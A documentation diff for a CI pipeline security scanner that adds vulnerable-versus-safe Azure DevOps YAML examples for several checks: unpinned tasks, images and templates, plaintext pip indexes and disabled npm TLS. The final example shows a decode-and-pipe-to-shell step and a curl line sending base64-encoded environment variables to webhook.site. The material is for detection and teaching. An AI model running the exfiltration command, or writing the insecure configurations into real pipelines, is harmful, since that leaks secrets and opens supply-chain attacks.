@@ -363,6 +363,35 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``AzureCLI@2`` resolves to whatever
+# Microsoft ships as version 2 at job-start time. A
+# Microsoft-pushed update silently changes the task body;
+# more importantly, custom Marketplace tasks at floating
+# major version are repointable by their publisher.
+steps:
+  - task: AzureCLI@2
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+
+# Safe: pin to a specific patch version (``AzureCLI@2.245.0``)
+# or use ``AzureCLI@2.x`` only for first-party Microsoft
+# tasks where Marketplace publish controls are stronger.
+# Renovate's azure-pipelines updater bumps these.
+steps:
+  - task: AzureCLI@2.245.0
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+```
+
 **Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }
@@ -386,6 +415,36 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.
 
 **Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a container resource pinned to a mutable
+# tag. The publisher (or anyone with publish access)
+# repoints the tag on the next refresh; every pipeline
+# run pulls the swap silently.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env:latest
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot's docker ecosystem bump the digest in PRs.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env@sha256:abc123...
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+```
 
 **Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -428,6 +487,29 @@ Every check that evidences this standard, rendered once with its detection mecha
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP. ``--trusted-host`` silences hash
+# verification for the named host, so an attacker on the
+# network path can swap wheels in flight.
+steps:
+  - bash: |
+      pip install \
+        --index-url http://internal-pypi.example.com/simple \
+        --trusted-host internal-pypi.example.com \
+        -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed in the agent's trust store.
+steps:
+  - bash: |
+      pip install \
+        --index-url https://internal-pypi.example.com/simple \
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -479,6 +561,27 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` disables
+# certificate verification for every subsequent npm call.
+# A network attacker MITMs the registry and ships
+# substituted tarballs that npm installs unverified.
+steps:
+  - bash: |
+      npm config set strict-ssl false
+      npm install
+
+# Safe: install the missing CA into the agent's trust
+# store and keep strict-ssl on.
+steps:
+  - bash: |
+      sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
+      sudo update-ca-certificates
+      npm install
+```
+
 **Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }
@@ -499,6 +602,36 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ref: refs/heads/main`` on a cross-repo
+# template is mutable. Whoever can push to ``main`` on
+# ``ci-templates`` ships code into every consumer's
+# pipeline on the next run.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: refs/heads/main
+steps:
+  - template: build.yml@templates
+
+# Safe: pin to a tag (immutable in Azure Repos when
+# branch policies enforce tag-protect) or a 40-char
+# commit SHA. Renovate's azure-pipelines updater bumps
+# these in reviewable PRs.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+steps:
+  - template: build.yml@templates
+```
+
 **Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }
@@ -513,6 +646,29 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a
+# known miner binary. A malicious PR (or compromised
+# co-maintainer) lands the payload in the pipeline file
+# itself; every subsequent run executes it.
+steps:
+  - bash: |
+      echo Z2g6Li4uIA== | base64 -d | sh
+      curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires here
+# it's either a compromise or a CTF fixture; treat as
+# incident response.
+steps:
+  - checkout: self
+  - bash: make build
+```
 
 **Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).
 
